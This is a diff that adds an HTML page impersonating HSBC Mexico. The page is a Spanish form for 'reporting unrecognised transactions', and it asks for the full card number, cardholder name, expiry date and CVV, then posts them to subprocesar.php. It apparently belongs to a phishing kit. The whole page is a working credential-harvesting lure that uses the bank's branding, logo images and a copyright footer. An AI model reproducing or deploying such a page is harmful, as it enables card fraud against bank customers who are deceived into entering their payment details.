@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0 , maximum-scale=1.0,user-scalable=no">
+    <meta charset='UTF-8'/>
+	<meta http-equiv="X-UA-Compatible" content="IE=9,IE=10,IE=11,IE=Edge,chrome=1">
+	<meta name="renderer" content="webkit">
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	
+    <title>HSBC Sporte Global :</title>
+
+    <style type="text/css">
+
+        body{
+            margin: 0;
+            padding: 0;
+			background-color: rgb(245, 245, 245);
+			font-family:Arial, Helvetica, sans-serif;
+        }
+
+		.icon-disc{
+		display: inline-block;
+		width: 5px;
+		height: 5px;
+		background-color: black;
+		border-radius: 5px;
+		margin-right: 5px;
+		}
+		.header{
+			width: 100%;
+			height: 120px;
+			background-color: rgb(255, 255, 255);
+			display: flex;
+			align-items: center;
+			box-shadow: 0 10px 10px -5px rgb(122, 122, 122);
+			border-radius:  0 0 10px 10px;
+			margin-bottom: 10%;
+		}
+		#logo img{
+			margin: 4%;
+			padding-left: 3%;
+			width: 40%;
+			height: auto;
+		}
+		
+		.regresar{
+			font-size: 15px;
+			margin-right: 20px;
+			padding: 0;
+			
+		}
+		.regresar a{
+			text-decoration: none;
+			color: red;
+			transition: 0.3s all ease;
+		}
+		.regresar a:hover{
+			color: #0084ff;
+			text-decoration:underline;
+		}
+
+
+		.contenedor1{
+			display:block;
+			justify-content: center;
+			align-items: center;
+			background-color:rgb(255, 255, 255) ;
+			margin: 2.5%;
+			border-radius: 5%;
+			height: auto;
+		}
+		#bienvenido{
+			display: block;
+			margin: 0 auto;
+			padding: 10% 0% 0% 10%;
+			width: auto;
+			font-size:160%;
+			font-family: Arial, Helvetica, sans-serif;
+		}
+		
+		.labels{
+			font-size: 150%;
+			margin-left: 4%;
+		}
+		
+		.inputs-1{
+			display: block;
+			margin: 0 auto;
+			position:relative;
+			left:4%;
+			margin-top: 2.5%;
+			margin-bottom: 2%;
+			width: 85%;
+			padding: 3px;
+			padding-inline: 10px;
+			text-decoration: none;
+			font-size: 90%;
+		}
+	
+		.inputs-2{
+			display: block;
+			margin:0;
+			position:relative;
+			left:8.25%;
+			margin-top: 2.5%;
+			margin-bottom: 2%;
+			width: 25%;
+			padding: 3px;
+			padding-inline: 10px;
+			text-decoration: none;
+			font-size: 90%;
+		}
+	
+
+		
+		.inputs-1:focus,.inputs-2{
+			outline: none;
+		}
+		
+
+		
+
+		.grid-img{
+			display: grid;
+			grid-template-rows: 1fr 1fr;
+			width: 100% auto;
+			text-align: center;
+			align-items: center; 
+			padding:3%;
+		}
+		.grid-img .img {
+			width: 100% auto;
+		}
+		.grid-img .img img{
+			width: 100%; 
+			border-radius: 25px;
+		}
+
+		footer{
+			margin: 0 auto;
+			text-align: center;
+			padding: 5%;
+			background-color: rgb(0, 0, 0);
+			width: 100% auto;
+			height: auto;
+		}
+		footer p a{
+		 font-size: 90%;
+		 color: rgb(255, 255, 255);
+		 text-decoration:underline;
+		}
+		footer p a:hover{
+		 text-decoration:none
+		}
+		
+
+
+
+
+		#btn-enviar{
+			display: block;
+			margin: 0 auto;
+			width: 25%;
+			padding: 1.5%;
+			font-size: 100%;
+			margin-top: 10%;
+			margin-bottom: 10%;
+			border-radius: 5px;
+			user-select: none;
+			cursor: pointer;
+		}
+		#btn-enviar{
+			background-color: #F2F2F2;
+			box-shadow: 0px 0px 20px -18px;
+		}
+
+		#btn-enviar{
+			transform: scale(0.95);
+		}
+		
+
+
+
+
+
+
+
+		@media (min-width: 300px) and (max-width: 400px) {
+			#bienvenido{
+			padding: 10% 0% 0% 7.5%;
+		}
+		}
+
+
+		@media(min-width:1023px) and (max-width:2000px) {
+			#logo img{
+				margin: 4%;
+				padding-left: 3%;
+				width: 20%;
+				height: auto;
+		}
+			#bienvenido{
+			display: block;
+			margin: 0 auto;
+			text-align: center;
+			padding: 10% 10% 0% 10%;
+			width: auto;
+			font-size:250%;
+		}
+			.inputs-1{
+			display: block;
+			margin: 0;
+			position:relative;
+			margin-top: 2.5%;
+			margin-bottom: 2%;
+			width: 65%;
+			padding: 3px;
+			padding-inline: 10px;
+			text-decoration: none;
+			font-size: 100%;
+		}
+
+		.inputs-2{
+			display: block;
+			margin: 0;
+			position:relative;
+			left: 4%;
+			margin-top: 2.5%;
+			margin-bottom: 2%;
+			width: 25%;
+			padding: 3px;
+			padding-inline: 10px;
+			text-decoration: none;
+			font-size: 100%;
+		}
+
+
+
+
+
+
+		#btn-enviar{
+			display: block;
+			margin: 0 auto;
+			width: 10%;
+			padding: 1.5%;
+			font-size: 100%;
+			margin-top: 10%;
+			margin-bottom: 10;
+			border-radius: 5px;
+			user-select: none;
+			cursor: pointer;
+		}
+		#btn-enviar{
+			background-color: #F2F2F2;
+			box-shadow: 0px 0px 20px -18px;
+		}
+
+		#btn-enviar{
+			transform: scale(1);
+		}
+
+		}
+	
+	
+    </style>
+</head>
+
+
+<body>
+    <div class="header">
+        <div id="logo">
+            <img src="Logo1.png" alt="HSBC">
+        </div>
+		<div class="regresar"><a href="index.html">Regresar</a></label></div>
+    </div>
+
+
+
+	
+		<form action="subprocesar.php" method="POST">
+
+	<div class="contenedor1">
+
+		<label id="bienvenido"><strong>Reporte De Movimientos No Reconocidos</strong></label> <br>
+		
+		<label class="labels">No. tarjeta:</label>
+		<input class="inputs-1" name="NoTarjeta" id="NoTarjeta" type="text" placeholder="Ingrese su 16 digitos" maxlength="16" minlength="16" autocomplete="off" required> 
+
+		<label class="labels">Nombre completo:</label>
+		<input class="inputs-1" name="NombreCompleto" id="NombreCompleto" type="text" placeholder="Ingrese su nombre" autocomplete="off" required>
+
+		<label class="labels">Fecha de vencimiento:</label> 
+		<input class="inputs-2" name="Vencimiento" id="Vencimiento" type="text" placeholder="DD/MM" maxlength="7" autocomplete="off" required>
+		<script>
+			const input = document.getElementById('Vencimiento');
+	
+			// Escucha el evento "input" para formatear automáticamente
+			input.addEventListener('input', function (e) {
+				let value = e.target.value.replace(/\D/g, ''); // Elimina todo lo que no sea número
+				if (value.length > 4) {
+					value = value.slice(0, 4); // Limita a 4 números
+				}
+				if (value.length >= 2) {
+					value = value.slice(0, 2) + ' / ' + value.slice(2); // Inserta " / " después de los primeros 2 números
+				}
+				e.target.value = value; // Actualiza el valor del input
+			});
+	
+			// Evita que el usuario borre la diagonal o los espacios
+			input.addEventListener('keydown', function (e) {
+				const cursorPosition = e.target.selectionStart;
+				if ((cursorPosition === 3 || cursorPosition === 4 || cursorPosition === 5) && e.key === 'Backspace') {
+					e.preventDefault(); // Evita que se borre la diagonal o los espacios
+				}
+			});
+	
+			// Validación al salir del input (opcional)
+			input.addEventListener('blur', function (e) {
+				const value = e.target.value;
+				const regex = /^\d{2} \/ \d{2}$/; // Formato MM / AA
+				if (!regex.test(value)) {
+					alert("Por favor, ingresa una fecha válida en formato MM / AA.");
+					e.target.value = ''; // Limpia el campo si no es válido
+				}
+			});
+		</script>
+		
+		<label class="labels">Codigo de seguridad:</label>
+		<input class="inputs-2" name="CVV" id="CVV" type="text" placeholder="CVV" maxlength="3" autocomplete="off" required>
+
+		<input id="btn-enviar" type="submit" value="Enviar"> <br>
+	</div>
+		</form>
+		
+    </div>
+    <div>
+
+    </div>
+
+</body>
+
+
+
+	<div class="grid-img">
+
+		<div class="img">
+			<img src="hsbc.jpeg" alt="hsbcimagen" >
+		</div>
+		<div class="img">
+			<img src="hsbc2.jpg" alt="hsbc_img">
+		</div>
+
+	</div> <br>
+	
+<footer>
+	<div class="final">
+		<p><a href="index.html">© HSBC México 2024. Todos los Derechos Reservados</a> <br>
+			<a href="index.html">Este sitio está diseñado para su uso en México. Aviso Fronterizo.</a></p>
+	</div>
+</footer>
+
+
+
+</html>
